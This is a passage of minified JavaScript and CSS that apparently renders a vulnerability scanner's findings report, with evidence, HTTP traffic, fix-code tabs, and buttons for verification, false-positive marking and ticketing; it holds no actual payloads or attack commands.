      <div class="src-section-body"><ol style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">`,y.forEach(b=>{p+=`<li>${S(b)}</li>`}),p+="</ol></div></div>"),p+=`<div class="src-detail-section">
    <div class="src-section-title">修复完成后的检查</div>
    <div class="src-section-body"><ul style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">
      <li>重新扫描同一地址，确认对应漏洞已消失。</li>
      <li>核对安全头、Cookie、重定向或页面响应是否符合预期。</li>
      <li>如果为高危项，建议先在测试环境验证再发布到生产。</li>
    </ul></div>
  </div>`,p+=Fr(e.fix_code||{}),p+="</div>",Array.isArray(e.references)&&e.references.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">参考资料</div>
      <ul class="src-references">`,e.references.forEach(b=>{p+=`<li><a href="${xe(b)}" target="_blank" rel="noopener">${S(b)}</a></li>`}),p+="</ul></div>"),Re&&ve()&&(p+=`<div class="src-detail-actions">
      <button class="src-action-btn verify" data-action="verify" data-finding-id="${xe(e.id||"")}" title="重新请求目标并尝试验证是否仍可复现">复测验证</button>
      <button class="src-action-btn false-positive" data-action="fp" data-finding-id="${xe(e.id||"")}" title="如果你判断该项不是实际漏洞，可标记为误报或观察项">标记复核</button>
      <button class="src-action-btn confirm" data-action="confirm" data-finding-id="${xe(e.id||"")}" title="如果你确认该项真实存在，可标记为有效漏洞并进入修复流程">确认有效</button>
      <button class="src-action-btn ticket" data-action="ticket" data-finding-id="${xe(e.id||"")}" title="将该漏洞转为修复工单并跟踪处理">转工单</button>
    </div>`),p+=`<div class="src-detail-footer">
    <span>发现时间：${Gt(e.discovered_at||"")}</span>
  </div>`,p+="</div>",p}function Pr(e,i){const t=!!e.request,s=!!e.response,r=!!e.payload,o=!!e.screenshot,a=!!e.notes,n=!!e.matched_signature,d=Pi(e.request),f=Pi(e.response);let v='<div class="src-detail-section">';(r||n||a)&&(v+=`<div class="src-section-title">命中信息</div>
    <div class="src-section-body src-evidence-meta">`,r&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">Payload</span>
        <code class="src-payload">${S(e.payload)}</code>
        <button class="src-copy-btn" data-copy="${xe(e.payload)}">复制</button>
      </div>`),n&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">命中签名</span>
        <code class="src-signature">${S(e.matched_signature)}</code>
      </div>`),a&&(v+=`<div class="src-evidence-row">
        <span class="src-evidence-label">备注</span>
        <span>${S(e.notes)}</span>
      </div>`),v+="</div>"),v+=`<div class="src-section-title">证据</div>
    <div class="src-section-body src-evidence-meta">`;const c=i.verification_status||(i.is_likely_fp?"suspected":"probable"),p=c==="confirmed"?"已验证":c==="probable"?"可能存在":"待人工复核",h=c==="confirmed"?"A级（已验证）":c==="probable"?"B级（可复现）":"C级（待人工复核）",m=e.location||e.position||e.selector||e.header||e.parameter||e.path||e.url||"";return v+=`<div class="src-evidence-row"><span class="src-evidence-label">可信度</span><span>${S(p)}</span></div>`,v+=`<div class="src-evidence-row"><span class="src-evidence-label">证据等级</span><span>${S(h)}</span></div>`,m&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">命中位置</span><span>${S(m)}</span></div>`),v+=`<div class="src-evidence-row"><span class="src-evidence-label">误报概率</span><span>${i.fp_score!==void 0?(i.fp_score*100).toFixed(0)+"%":"—"}</span></div>`,d&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">请求摘要</span><span>${S(d)}</span></div>`),f&&(v+=`<div class="src-evidence-row"><span class="src-evidence-label">响应摘要</span><span>${S(f)}</span></div>`),v+="</div>",(t||s)&&(v+=`<div class="src-section-title">HTTP 流量</div>
    <div class="src-traffic-viewer">`,t&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>请求</span>
          <button class="src-copy-btn" data-copy="${xe(e.request)}">复制</button>
        </div>
        <pre><code>${S(e.request)}</code></pre>
      </div>`),s&&(v+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>响应</span>
          <button class="src-copy-btn" data-copy="${xe(e.response)}">复制</button>
        </div>
        <pre><code>${S(e.response)}</code></pre>
      </div>`),v+="</div>"),o&&(v+=`<div class="src-screenshot-row">
      <span class="src-evidence-label">截图</span>
      <img src="${xe(e.screenshot)}" alt="证据截图" loading="lazy">
    </div>`),!t&&!s&&!r&&!o&&!a&&!n&&(v+=`<div class="src-section-title">证据</div>
    <div class="src-section-body"><div class="src-no-evidence">无详细技术证据</div></div>`),v+="</div>",v}function Pi(e){if(!e)return"";const i=String(e).split(/\r?\n/).map(n=>n.trim()).filter(Boolean);if(!i.length)return"";const t=i.find(n=>/^HTTP\/\d/i.test(n)),s=i.find(n=>/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+/i.test(n)),r=s?s.split(/\s+/).slice(0,2).join(" "):"",o=i.filter(n=>/^[A-Za-z0-9\-]+:\s*/.test(n)).slice(0,3),a=[];return t&&a.push(t.replace(/^HTTP\/\d\.\d\s*/i,"HTTP ")),r&&a.push(r),o.length&&a.push(o.join(" | ")),a.join(" · ").slice(0,220)}function Fr(e){const t=[{key:"nginx",label:"Nginx"},{key:"apache",label:"Apache"},{key:"express",label:"Express"},{key:"flask",label:"Flask"},{key:"spring_boot",label:"Spring Boot"},{key:"cloudflare",label:"Cloudflare"},{key:"generic",label:"通用"}].filter(r=>e[r.key]);if(t.length===0)return"";let s=`<div class="src-detail-section">
    <div class="src-section-title">修复代码</div>
    <div class="src-fix-tabs">`;return t.forEach(r=>{const o=r.key===lt?"active":"";s+=`<button class="src-fix-tab ${o}" data-tab="${r.key}">${r.label}</button>`}),s+="</div>",t.forEach(r=>{const o=r.key===lt?"active":"hidden";s+=`<div class="src-fix-panel ${o}" data-panel="${r.key}">
      <pre><code>${S(e[r.key])}</code></pre>
      <button class="src-copy-btn" data-copy="${xe(e[r.key])}">复制代码</button>
    </div>`}),s+="</div>",s}function jr(){const e=document.getElementById("result-content")||document.getElementById("result-container");!e||e.dataset.srcResultBound==="1"||(e.dataset.srcResultBound="1",e.addEventListener("click",function(i){const t=i.target.closest(".src-list-item");if(t){const f=parseInt(t.dataset.index,10);$r(f);return}const s=i.target.closest(".src-detail-tab");if(s){const f=s.dataset.tab,v=s.closest(".src-detail-card");if(!v)return;v.querySelectorAll(".src-detail-tab").forEach(c=>c.classList.remove("active")),s.classList.add("active"),v.querySelectorAll(".src-detail-panel").forEach(c=>{c.classList.toggle("active",c.dataset.panel===f)});return}const r=i.target.closest(".src-fix-tab");if(r){lt=r.dataset.tab,document.querySelectorAll(".src-fix-tab").forEach(f=>f.classList.remove("active")),r.classList.add("active"),document.querySelectorAll(".src-fix-panel").forEach(f=>{f.classList.toggle("active",f.dataset.panel===lt),f.classList.toggle("hidden",f.dataset.panel!==lt)});return}const o=i.target.closest(".src-copy-btn");if(o){const f=o.dataset.copy||"";wt(f).then(()=>L("已复制到剪贴板"));return}const a=i.target.closest(".src-export-btn");if(a){a.id==="src-copy-summary"?Hr():Dr();return}const n=i.target.closest(".src-filter-btn");if(n&&n.dataset.action==="toggle-fp-filter"){Ye=!Ye;const f=Ye?Pe.filter(c=>!c.is_likely_fp):Pe;qt=0;const v=document.getElementById("src-detail-panel");v&&(v.innerHTML=vi(f[0]));return}i.target.closest(".src-action-btn")&&Nr(i)}))}async function Hr(){if(!Re)return;const i=Array.from(document.querySelectorAll(".finding-card")).slice(0,3).map((r,o)=>{const a=r.querySelector(".finding-title"),n=r.querySelector(".finding-severity");return`${o+1}. ${a?a.textContent.trim():"未命名项"}${n?`（${n.textContent.trim()}）`:""}`}).filter(Boolean),t=Math.max(0,(Ht.total||0)-(Ht.fp_count||0)),s=["报告摘要","扫描 ID: "+Re,"URL: "+hi,"安全评分: "+rn,"总计: "+(Ht.total||0),"待处理: "+t,i.length?`重点项:
`+i.join(`
`):"重点项: 无","建议: 优先处理高危和严重项，修复后复测。"].join(`
`);await wt(s),L("报告摘要已复制")}async function Dr(){if(Re)try{const i=await(await br({scan_id:Re,format:"markdown"})).blob(),t=URL.createObjectURL(i),s=document.createElement("a");s.href=t,s.download=`src-report-${Re}.md`,document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(t),L("SRC 报告已开始下载")}catch(e){L("导出失败："+(e&&e.message?e.message:"未知错误"))}}async function Nr(e){const i=e.currentTarget,t=i.dataset.action,s=i.dataset.findingId,r=Pe.find(n=>n.id===s);if(!Re||!r)return;if(t==="verify"){i.textContent="验证中...",i.disabled=!0;try{const n=await xr({scan_id:Re,finding_id:s,url:r.url||hi});if(n&&n.success){const d=n.reproducible===!0?"仍可复现":n.reproducible===!1?"已无法复现":"需人工复测";L(`验证完成：${d}`)}else L("验证失败："+(n&&n.error?n.error:"未知错误"))}catch{L("验证请求失败")}finally{i.textContent="验证复现",i.disabled=!1}return}const o=t==="fp"?"标记中...":t==="ticket"?"创建中...":"提交中...",a=t==="fp"?"标记误报":t==="ticket"?"工单":"确认有效";i.textContent=o,i.disabled=!0;try{if(t==="ticket"){const n=await hr({scan_id:Re,finding_name:r.title||s,severity:r.severity||"low",fix_code:r.fix_code&&r.fix_code.generic?r.fix_code.generic:"",notes:r.fix_suggestion||r.description||""});n&&n.success?(L("工单已创建"),setTimeout(function(){zr("tickets")},300)):L("工单失败："+(n&&n.error?n.error:"未知错误"))}else{const n=await wr({scan_id:Re,finding_name:r.title||s,finding_type:r.type||"",is_false_positive:t==="fp",is_confirmed:t==="confirm"});n&&n.success?L(t==="fp"?"误报，后续会用于优化检测":"已确认漏洞，已记录到反馈闭环"):L("反馈提交失败："+(n&&n.error?n.error:"未知错误"))}}catch{L(t==="ticket"?"工单创建失败":"反馈请求失败")}finally{i.textContent=a,i.disabled=!1}}function $r(e){qt=e,document.querySelectorAll(".src-list-item").forEach((t,s)=>{t.classList.toggle("active",s===e)});const i=document.getElementById("src-detail-panel");i&&(i.innerHTML=vi(Pe[e]))}function Ur(){if(document.getElementById("src-result-styles"))return;const e=document.createElement("style");e.id="src-result-styles",e.textContent=`
    .src-report-header { display:flex; gap:20px; align-items:center; background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin-bottom:16px; }
    .src-score-wrap { flex:0 0 auto; }
    .src-score-ring { width:110px; height:110px; border-radius:50%; display:flex; flex-direction:column; align-items:center; justify-content:center; border:3px solid rgba(255,255,255,0.1); }
    .src-score-value { font-size:34px; font-weight:800; line-height:1; }
    .src-score-label { font-size:11px; opacity:0.85; margin-top:4px; }
    .src-report-meta { flex:1; min-width:0; }
    .src-report-title-row { display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
    .src-report-url { font-family:var(--font); font-size:13px; color:var(--text-secondary); word-break:break-all; }
    .src-report-stats { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; }
    .src-stat { min-width:64px; text-align:center; padding:8px 10px; border-radius:var(--radius-sm); background:var(--bg-secondary); border:1px solid var(--border-light); }
    .src-stat .num { font-size:18px; font-weight:700; }
    .src-stat .label { font-size:11px; color:var(--text-secondary); }
    .src-stat.critical .num { color:#c75450; }
    .src-stat.high .num { color:#f0a732; }
    .src-stat.medium .num { color:#f0a732; }
    .src-stat.low .num { color:#73c990; }
    .src-stat.info .num { color:#808080; }
    .src-stat.total .num { color:var(--primary-light); }
    .src-report-submeta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--text-secondary); }
    .meta-item { background:var(--token-bg); padding:3px 8px; border-radius:var(--radius-xs); }
    .src-report-actions { margin-top:12px; }
    .src-export-btn { background:var(--primary); color:#fff; border:none; padding:6px 14px; border-radius:var(--radius-xs); font-size:12px; cursor:pointer; }
    .src-export-btn:hover { background:var(--primary-light); }
    .src-report-capability { margin-top:12px; padding:12px 14px; border-radius:var(--radius-sm); background:rgba(115,201,144,0.08); border:1px solid rgba(115,201,144,0.18); }
    .src-report-capability-title { font-size:12px; font-weight:700; margin-bottom:8px; color:#73c990; }
    .src-report-capability-grid { display:grid; grid-template-columns:repeat(3, minmax(0, 1fr)); gap:10px; }
    .src-report-capability-item { background:rgba(255,255,255,0.03); border:1px solid var(--border-light); border-radius:var(--radius-xs); padding:8px 10px; display:flex; flex-direction:column; gap:4px; }
    .src-report-capability-item span { font-size:11px; color:var(--text-secondary); }
    .src-report-capability-item strong { font-size:13px; color:var(--text-primary); }
    .src-report-capability-text { margin-top:8px; font-size:12px; color:var(--text-secondary); line-height:1.7; }
    @media (max-width: 900px) { .src-report-capability-grid { grid-template-columns:1fr; } }
    .src-report-priority-list { display:grid; gap:8px; margin-top:10px; }
    .src-report-priority-item { display:flex; gap:10px; align-items:flex-start; padding:10px 12px; border:1px solid var(--border-light); border-radius:var(--radius-xs); background:rgba(255,255,255,0.03); }
    .src-report-priority-index { width:18px; height:18px; border-radius:999px; display:inline-flex; align-items:center; justify-content:center; background:rgba(115,201,144,0.18); color:#73c990; font-size:11px; font-weight:700; flex:0 0 auto; margin-top:1px; }
    .src-surface-overview { margin-bottom:16px; padding:16px 18px; background:linear-gradient(180deg, rgba(75,110,175,0.12), rgba(75,110,175,0.04)); border:1px solid rgba(75,110,175,0.24); border-radius:var(--radius); }
    .src-surface-overview-head { display:flex; align-items:flex-start; justify-content:space-between; gap:12px; margin-bottom:12px; }
    .src-surface-overview-title { font-size:14px; font-weight:700; color:var(--text-primary); }
    .src-surface-overview-subtitle { margin-top:3px; font-size:12px; color:var(--text-secondary); line-height:1.5; }
    .src-surface-overview-pill { font-size:11px; font-weight:700; color:var(--primary-light); background:rgba(75,110,175,0.12); border:1px solid rgba(75,110,175,0.24); border-radius:999px; padding:4px 10px; white-space:nowrap; }
    .src-surface-grid { display:grid; grid-template-columns:repeat(4, minmax(0, 1fr)); gap:10px; }
    @media (max-width: 1100px) { .src-surface-grid { grid-template-columns:repeat(2, minmax(0, 1fr)); } }
    @media (max-width: 640px) { .src-surface-grid { grid-template-columns:1fr; } .src-surface-overview-head { flex-direction:column; } }
    .surface-card { padding:12px; border-radius:var(--radius-sm); border:1px solid var(--border-light); background:rgba(255,255,255,0.03); display:flex; flex-direction:column; gap:8px; }
    .surface-card.critical { border-color:rgba(199,84,80,0.34); background:rgba(199,84,80,0.08); }
    .surface-card.medium { border-color:rgba(240,167,50,0.34); background:rgba(240,167,50,0.08); }
    .surface-card.low { border-color:rgba(115,201,144,0.28); background:rgba(115,201,144,0.06); }
    .surface-card-head { display:flex; align-items:center; justify-content:space-between; gap:10px; }
    .surface-card-title { font-size:13px; font-weight:700; color:var(--text-primary); }
    .surface-card-badge { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.2px; color:var(--text-secondary); background:var(--token-bg); padding:2px 6px; border-radius:999px; }
    .surface-card-count { font-size:26px; font-weight:800; line-height:1; color:var(--text-primary); }
    .surface-card-detail { font-size:11px; color:var(--text-secondary); line-height:1.5; }

    .src-quality-panel { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:16px; overflow:hidden; }
    .src-quality-header { display:flex; align-items:center; gap:20px; padding:14px 18px; cursor:pointer; }
    .src-quality-score-wrap { display:flex; flex-direction:column; align-items:center; gap:4px; }
    .src-quality-ring { width:48px; height:48px; border-radius:50%; border:3px solid; display:flex; align-items:center; justify-content:center; }
    .src-quality-title { font-size:11px; color:var(--text-secondary); }
    .src-quality-bars { flex:1; display:flex; flex-direction:column; gap:6px; }
    .src-quality-bar-row { display:flex; align-items:center; gap:10px; }
    .src-quality-bar-label { width:50px; font-size:12px; color:var(--text-secondary); text-align:right; }
    .src-quality-bar { flex:1; height:8px; background:var(--bg-secondary); border-radius:4px; overflow:hidden; }
    .src-quality-bar-fill { height:100%; border-radius:4px; transition:width 0.6s ease; }
    .src-quality-bar-val { width:28px; font-size:12px; font-weight:600; text-align:right; }
    .src-quality-expand { background:var(--bg-secondary); border:1px solid var(--border); color:var(--text-secondary); padding:4px 10px; border-radius:var(--radius-xs); font-size:11px; cursor:pointer; white-space:nowrap; }
    .src-quality-expand:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-quality-detail { padding:0 18px 14px; border-top:1px solid var(--border-light); }
    .src-quality-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:12px; }
    @media (max-width:700px) { .src-quality-grid { grid-template-columns:1fr; } }
    .src-quality-section { }
    .src-quality-section-title { font-size:12px; font-weight:700; color:var(--text-secondary); margin-bottom:8px; }
    .src-quality-section-body { display:flex; flex-direction:column; gap:4px; }
    .src-quality-kv { display:flex; justify-content:space-between; align-items:center; font-size:12px; }
    .src-quality-kv span { color:var(--text-secondary); }
    .src-quality-kv code { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); font-size:11px; }
    .src-quality-dedup { display:flex; align-items:center; gap:8px; margin-top:12px; padding:10px; background:var(--bg-secondary); border-radius:var(--radius-sm); flex-wrap:wrap; }
    .src-quality-label { font-size:12px; font-weight:700; color:var(--text-secondary); }
    .src-quality-stat { font-size:13px; font-weight:600; }
    .src-quality-stat.highlight { color:var(--primary-light); }
    .src-quality-arrow { color:var(--text-secondary); }
    .src-quality-tag { background:var(--token-bg); padding:2px 8px; border-radius:10px; font-size:11px; color:var(--text-secondary); }
    .src-quality-recommendations { margin-top:12px; }
    .src-quality-rec-list { margin:0; padding-left:18px; font-size:12px; color:var(--text-secondary); }
    .src-quality-rec-list li { margin-bottom:4px; line-height:1.5; }

    .src-result-layout { display:grid; grid-template-columns:380px 1fr; gap:16px; }
    @media (max-width:900px) { .src-result-layout { grid-template-columns:1fr; } }

    .src-result-sidebar { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; max-height:calc(100vh - 220px); display:flex; flex-direction:column; }
    .src-list-header { padding:12px 14px; border-bottom:1px solid var(--border-light); font-weight:700; font-size:13px; display:flex; align-items:center; justify-content:space-between; }
    .src-list-count { background:var(--primary); color:#fff; font-size:11px; padding:2px 8px; border-radius:10px; }
    .src-list-items { overflow-y:auto; flex:1; padding:6px; }
    .src-list-item { padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; border-left:3px solid transparent; margin-bottom:4px; transition:background .12s; }
    .src-list-item:hover { background:var(--bg-secondary); }
    .src-list-item.active { background:var(--verify-selected); border-left-color:var(--primary); }
    .src-list-item.critical { border-left-color:#c75450; }
    .src-list-item.high { border-left-color:#c75450; }
    .src-list-item.medium { border-left-color:#f0a732; }
    .src-list-item.low { border-left-color:#73c990; }
    .src-list-item.info { border-left-color:#808080; }
    .src-list-row { display:flex; align-items:center; gap:8px; }
    .src-list-row.top { align-items:flex-start; }
    .src-list-row.meta { margin-top:6px; flex-wrap:wrap; font-size:11px; }
    .src-sev-badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; flex:0 0 auto; }
    .src-sev-badge.critical { background:#c75450; }
    .src-sev-badge.high { background:#c75450; }
    .src-sev-badge.medium { background:#f0a732; color:#000; }
    .src-sev-badge.low { background:#73c990; color:#000; }
    .src-sev-badge.info { background:#808080; }
    .src-list-title { font-size:13px; font-weight:600; color:var(--text-primary); flex:1; word-break:break-word; line-height:1.4; }
    .src-list-type { font-size:10px; background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); color:var(--text-secondary); }
    .src-list-surface { font-size:10px; background:rgba(115,201,144,0.12); color:#73c990; padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-param { font-size:10px; background:rgba(75,110,175,0.15); color:var(--primary-light); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-host { color:var(--text-secondary); font-family:var(--font); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:180px; }
    .src-list-confidence { font-size:11px; color:var(--text-secondary); margin-left:auto; text-transform:uppercase; }
    .src-list-fp-tag { background:#c7545022; color:#c75450; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; }
    .src-list-fp-tag-alert { background:rgba(240,167,50,0.18); color:#f0a732; }
    .src-list-fp-tag-alert.fp { background:rgba(199,84,80,0.18); color:#c75450; }
    .src-list-fp-tag-alert.info { background:rgba(128,128,128,0.18); color:#808080; }
    .src-list-merged { background:var(--primary); color:#fff; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .src-list-corr { background:var(--token-bg); color:var(--text-secondary); font-size:10px; padding:1px 5px; border-radius:3px; font-family:var(--font); }
    .src-list-v { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-v.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-v.probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .src-list-v.suspected { background:rgba(199,84,80,0.2); color:#c75450; }
    .src-list-fb { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-fb.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-fb.fp { background:rgba(128,128,128,0.2); color:#808080; }
    .src-list-confidence.high { color:#73c990; }
    .src-list-confidence.medium { color:#f0a732; }
    .src-list-confidence.low { color:#c75450; }
    .verification-badge { display:flex; gap:4px; align-items:center; }
    .verification-badge span { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .v-confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .v-probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .v-suspected { background:rgba(199,84,80,0.2); color:#c75450; }

    .src-result-detail { max-height:calc(100vh - 220px); overflow-y:auto; }
    .src-detail-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:0; display:flex; flex-direction:column; }
    .src-detail-header { border-bottom:1px solid var(--border-light); padding:16px 18px 14px; }
    .src-detail-title-row { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
    .src-detail-severity { font-size:11px; font-weight:700; padding:3px 10px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; }
    .src-detail-severity.critical { background:#c75450; }
    .src-detail-severity.high { background:#c75450; }
    .src-detail-severity.medium { background:#f0a732; color:#000; }
    .src-detail-severity.low { background:#73c990; color:#000; }
    .src-detail-severity.info { background:#808080; }
    .src-detail-title { font-size:17px; font-weight:700; margin:0; color:var(--text-primary); flex:1; line-height:1.4; }
    .src-detail-status { font-size:11px; padding:2px 8px; border-radius:var(--radius-xs); margin-left:auto; border:1px solid var(--border-light); }
    .src-detail-status.open { background:rgba(240,167,50,0.12); color:#f0a732; border-color:rgba(240,167,50,0.3); }
    .src-detail-status.confirmed { background:rgba(199,84,80,0.15); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-detail-status.false_positive { background:rgba(128,128,128,0.15); color:#808080; border-color:rgba(128,128,128,0.3); }
    .src-detail-status.fixed { background:rgba(115,201,144,0.15); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-detail-subtitle { display:flex; gap:10px; flex-wrap:wrap; align-items:center; font-size:12px; color:var(--text-secondary); }
    .src-detail-id { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-detail-type { color:var(--primary-light); font-weight:600; }
    .src-detail-cwe { background:rgba(199,84,80,0.12); color:#e08e8a; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-owasp { background:rgba(75,110,175,0.12); color:var(--primary-light); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-cvss { background:rgba(240,167,50,0.12); color:#f0a732; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-score { background:rgba(115,201,144,0.12); color:#73c990; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-confidence { background:var(--token-bg); color:var(--text-secondary); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-fp-badge { background:rgba(199,84,80,0.15); color:#c75450; padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge { padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge.verified { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.unverified { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.confirmed { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.probable { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.suspected { background:rgba(199,84,80,0.15); color:#c75450; }
    .src-fp-banner { margin:12px 0 4px; padding:12px 14px; border:1px solid rgba(240,167,50,0.35); border-radius:var(--radius-sm); background:linear-gradient(135deg, rgba(240,167,50,0.12), rgba(199,84,80,0.08)); }
    .src-fp-banner-title { font-size:13px; font-weight:700; color:#f0a732; margin-bottom:4px; }
    .src-fp-banner-desc { font-size:12px; color:var(--text-secondary); line-height:1.6; }

    .src-fp-reasons { margin-top:8px; }
    .src-fp-reasons ul { margin:0; padding-left:18px; }
    .src-fp-reasons li { font-size:12px; color:var(--text-secondary); margin-bottom:3px; }

    .src-detail-tabs { display:flex; border-bottom:1px solid var(--border-light); background:var(--bg-secondary); }
    .src-detail-tab { background:transparent; border:none; border-bottom:2px solid transparent; color:var(--text-secondary); padding:10px 16px; font-size:12px; font-weight:600; cursor:pointer; }
    .src-detail-tab:hover { color:var(--text-primary); }
    .src-detail-tab.active { color:var(--primary-light); border-bottom-color:var(--primary); background:rgba(75,110,175,0.08); }
    .src-detail-panel { display:none; padding:18px; }
    .src-detail-panel.active { display:block; }

    .src-detail-section { margin-bottom:18px; }
    .src-section-title { font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px; display:flex; align-items:center; gap:6px; text-transform:uppercase; letter-spacing:0.3px; }
    .src-section-body { font-size:13px; color:var(--text); line-height:1.7; }
    .src-kv { display:flex; gap:10px; margin-bottom:6px; align-items:flex-start; }
    .src-k { min-width:60px; color:var(--text-secondary); font-size:12px; }
    .src-v { flex:1; word-break:break-all; }
    .src-repro-steps { padding-left:18px; margin:0; }
    .src-repro-steps li { margin-bottom:6px; }

    .src-evidence-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; flex-wrap:wrap; }
    .src-evidence-label { font-size:12px; color:var(--text-secondary); min-width:60px; }
    .src-payload { background:#3b0d0d; color:#fecaca; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid rgba(199,84,80,0.35); font-size:12px; word-break:break-all; flex:1; }
    .src-signature { background:#2b2b2b; color:#bbbbbb; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid var(--border-light); font-size:12px; word-break:break-all; flex:1; font-family:var(--font); }
    .src-traffic-viewer { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
    @media (max-width:1100px) { .src-traffic-viewer { grid-template-columns:1fr; } }
    .src-traffic-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); overflow:hidden; display:flex; flex-direction:column; min-height:180px; }
    .src-traffic-header { display:flex; align-items:center; justify-content:space-between; padding:8px 12px; background:var(--bg-secondary); border-bottom:1px solid var(--border-light); font-size:12px; font-weight:600; color:var(--text-secondary); }
    .src-traffic-header .src-copy-btn { margin:0; }
    .src-traffic-panel pre { margin:0; padding:12px; overflow:auto; max-height:420px; flex:1; }
    .src-traffic-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }
    .src-screenshot-row img { max-width:100%; border:1px solid var(--border-light); border-radius:var(--radius-sm); margin-top:6px; }
    .src-no-evidence { color:var(--text-secondary); font-size:12px; }

    .src-fix-tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px; }
    .src-fix-tab { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:5px 12px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-fix-tab.active { background:var(--primary); color:#fff; border-color:var(--primary); }
    .src-fix-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); padding:12px; position:relative; }
    .src-fix-panel.hidden { display:none; }
    .src-fix-panel pre { margin:0; overflow:auto; max-height:360px; }
    .src-fix-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }

    .src-copy-btn { background:rgba(75,110,175,0.15); border:1px solid rgba(75,110,175,0.3); color:var(--primary-light); padding:4px 10px; border-radius:var(--radius-xs); cursor:pointer; font-size:11px; }
    .src-copy-btn:hover { background:var(--primary); color:#fff; }
    .src-references { padding-left:18px; margin:0; }
    .src-references li { margin-bottom:6px; word-break:break-all; }
    .src-detail-actions { display:flex; gap:10px; flex-wrap:wrap; padding:0 18px 18px; }
    .src-action-btn { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:6px 14px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-action-btn:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-action-btn.verify { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-action-btn.false-positive { background:rgba(115,201,144,0.12); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-action-btn.confirm { background:rgba(199,84,80,0.12); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-action-btn.ticket { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-detail-footer { font-size:12px; color:var(--text-secondary); border-top:1px solid var(--border-light); padding:12px 18px; }
    .src-empty { padding:30px; text-align:center; color:var(--text-secondary); }
    .src-empty-detail { padding:40px; text-align:center; color:var(--text-secondary); background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); }
